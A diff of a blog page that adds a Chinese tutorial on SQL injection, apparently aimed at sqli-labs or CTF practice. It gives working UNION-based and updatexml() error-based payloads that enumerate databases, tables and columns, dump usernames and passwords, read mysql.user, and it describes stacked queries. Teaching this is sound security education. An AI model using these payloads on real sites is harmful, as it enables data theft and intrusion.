@@ -89,9 +89,142 @@ replay-btn" aria-hidden="true"></i></a>
     <hr>
   </div>
   <div class="post-content">
-    <p>gciyaevcyiucbqaeuyicbvqcbqiuwycbv</p>
-<p>bcyiqwevcascbiouawc</p>
-<p>cnqwaouchpbcnaiwocn</p>
+    <h1 id="基础漏洞："><a href="#基础漏洞：" class="headerlink" title="基础漏洞："></a>基础漏洞：</h1><h3 id="1-SQL注入："><a href="#1-SQL注入：" class="headerlink" title="1.SQL注入："></a>1.SQL注入：</h3><p><strong>实现原理</strong>：脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面展示），</p>
+<p>将定义的SQL语句 进行查询数据时，其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（例如数据库中的敏感数据，如管理员的账号密码等等）。这过程就叫做SQL注入漏洞。</p>
+<p><strong>注入条件：</strong></p>
+<ul>
+<li>用户可以控制数据的输入。</li>
+<li>原本要运行的代码拼接了用户的输入并运行。</li>
+</ul>
+<h4 id="常见SQL注入语句："><a href="#常见SQL注入语句：" class="headerlink" title="常见SQL注入语句："></a>常见SQL注入语句：</h4><p><strong>数据查询语句（SELECT）</strong>：用于从数据库中检索数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>数据插入语句（INSERT）</strong>：用于向数据库中插入新数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2) <span class="keyword">VALUES</span> (value1, value2);</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据更新语句（UPDATE）</strong>：用于更新数据库中的现有数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2 <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>数据删除语句（DELETE）</strong>：用于从数据库中删除数据。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>创建表语句（CREATE TABLE）</strong>：用于创建新的数据表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>修改表结构语句（ALTER TABLE）</strong>：用于修改已有数据表的结构。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> column_name datatype;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>删除表语句（DROP TABLE）</strong>：用于删除数据表。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>授权语句（GRANT）</strong>：用于授权用户访问数据库或特定数据表的权限。****</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> permission <span class="keyword">ON</span> table_name <span class="keyword">TO</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>撤销授权语句（REVOKE）</strong>：用于撤销用户对数据库或数据表的权限。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> permission <span class="keyword">ON</span> table_name <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>数据聚合函数</strong>：用于对数据进行聚合计算，如求和、平均值等。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(column_name) <span class="keyword">FROM</span> table_name;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(column_name) <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>
+
+<h2 id="有回显的sql注入方式："><a href="#有回显的sql注入方式：" class="headerlink" title="有回显的sql注入方式："></a>有回显的sql注入方式：</h2><h3 id="1-联合查询注入："><a href="#1-联合查询注入：" class="headerlink" title="1.联合查询注入："></a>1.联合查询注入：</h3><h4 id="UNION操作："><a href="#UNION操作：" class="headerlink" title="UNION操作："></a>UNION操作：</h4><p><code>UNION</code> 是一个 SQL 操作符，用于合并两个或多个 <code>SELECT</code> 语句的结果集并去除重复的行。</p>
+<p>语法结构如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是，<code>UNION</code> 操作符默认会去除重复的行。如果需要保留所有的行（包括重复的行），可以使用 <code>UNION ALL</code> 操作符。即在上述代码块的“union”后加 “ALL”。</p>
+<h4 id="注入流程："><a href="#注入流程：" class="headerlink" title="注入流程："></a>注入流程：</h4><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据</p>
+<p>判断类型：</p>
+<p>example：</p>
+<p>先在url界面输入id&#x3D;1，然后用单引号闭合，将单引号注释掉后发现恢复正常，说明输入的单引号与前面的id&#x3D;1形成一个闭合，就可判断注入类型为字符型，闭合方式为单引号。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d<span class="string">&#x27; and 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<p>使用上面的代码，若返回正常，则判断为字符型注入点</p>
+<p><strong>判断字段数（有些题目不做要求，也叫做查询了多少列数据）：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们要对字段数进行判断</p>
+<p>使用 order by number输出第number列，不断的增加number地大小直到报错，此时的number-1就是字段数。</p>
+<p><strong>判断回显点：</strong></p>
+<p>使用语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>‘ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>查看到显示num1，num2。于是判断显示位为第num1个元素和第num2个元素。</p>
+<p>这里将id值改为111是为了让前面查询的语句为空，无显示，然后后面查询语句查询的元素显示出来。</p>
+<p>也可以用limit语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 limit 1,1 --+</span></span><br></pre></td></tr></table></figure>
+
+<p>而 limit num1，num2的作用为**从第num1行开始显示num2行内容</p>
+<p><strong>爆破库名：</strong></p>
+<p>比如第二三个显示位都可查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(database()) <span class="comment">--+</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>爆破表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(group_concat(table_name) frominformation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>‘security’) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>上面第一段代码即在第二行显示所用的表名，第二段是在第三行显示。</p>
+<p>information_schema是mysql自带的库，记录了该数据库<strong>所有的表名和字段名</strong>，里面有一个tables表，里面存有整个数据库的表名。我们要去查找的表，就是在这个库中去找。使用group_concat()函数将所有查询的表名连在一起成为一条数据。</p>
+<p><strong>爆破字段名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span> <span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> ‘security’ <span class="keyword">and</span> table_name <span class="operator">=</span> ‘users’ ) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库中，有一个information_schema库，里面有一个columns表，里面存有整个数据库的列名。我们要去查找的列，就是在这个库中去找。以上payload可解释为：查询数据库security下表users中的所有字段。</p>
+<p><strong>查找数据：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,0x5c,password),3 from security.users --+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">111</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> security.users <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>其中第一段代码中的0x5c是\的十六进制编码，便于将password和username分开</p>
+<p>至此，UNION注入完成。</p>
+<h3 id="2-Error注入攻击："><a href="#2-Error注入攻击：" class="headerlink" title="2.Error注入攻击："></a>2.Error注入攻击：</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>通过让网站执行SQL时报错来查询自己想要的信息</p>
+<p><strong>有关函数：</strong></p>
+<p><strong>updatexml（）函数</strong></p>
+<ul>
+<li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li>
+<li>作用：改变文档中符合条件的节点的值</li>
+<li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>如果我们在参数2的位置，将查询语句和特殊符号拼接在一起，就可以将查询结果显示在报错信息中，在地址栏中输入：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,version()), 3) -- a</span></span><br></pre></td></tr></table></figure>
+
+<p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p>
+<p>提示：version（）：返回数据库版本</p>
+<p>concat（）：拼接特殊符号和查询结果</p>
+<p>需要注意的是：查询结果必须是一个数据，如果查询结果是多行或多个数据，可以</p>
+<p><img src="https://img-blog.csdnimg.cn/a5f778a3fdcf433da4f31339fe655564.png" alt="在这里插入图片描述"></p>
+<p>updatexml() 函数的报错内容长度不能超过32个字符，常用的解决方式有两种：</p>
+<ol>
+<li><p>limit 分页</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">	(select user</span></span><br><span class="line"><span class="string">	from mysql.user limit 1,1)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>substr()截取字符</p>
+</li>
+</ol>
+<p>以查询数据库用户为例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">	substr(</span></span><br><span class="line"><span class="string">		(select group_concat(user)</span></span><br><span class="line"><span class="string">		from mysql.user)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤总结："><a href="#步骤总结：" class="headerlink" title="步骤总结："></a>步骤总结：</h3><h5 id="1-判断是否报错"><a href="#1-判断是否报错" class="headerlink" title="1.判断是否报错"></a>1.判断是否报错</h5><p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; -- a</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-判断报错条件"><a href="#2-判断报错条件" class="headerlink" title="2.判断报错条件"></a>2.判断报错条件</h5><p>参数中添加报错函数，检查报错信息是否正常回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,3) -- a</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-脱库"><a href="#3-脱库" class="headerlink" title="3.脱库"></a>3.脱库</h5><p>获取所有数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(schema_name)</span></span><br><span class="line"><span class="string">		from information_schema.schemata)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>获取所有表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(table_name)</span></span><br><span class="line"><span class="string">		from information_schema.tables</span></span><br><span class="line"><span class="string">		where table_schema = &#x27;</span>security<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>获取所有字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">	substr( </span></span><br><span class="line"><span class="string">		(select group_concat(column_name)</span></span><br><span class="line"><span class="string">		from information_schema.columns</span></span><br><span class="line"><span class="string">		where table_schema = &#x27;</span>security<span class="string">&#x27; and table_name = &#x27;</span>users<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">	, 1 , 31)</span></span><br><span class="line"><span class="string">),3) -- a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-堆叠注入"><a href="#3-堆叠注入" class="headerlink" title="3.堆叠注入"></a>3.堆叠注入</h3><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是用个;分隔，成堆的执行sql语句</p>
+<p>虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
 
   </div>
   
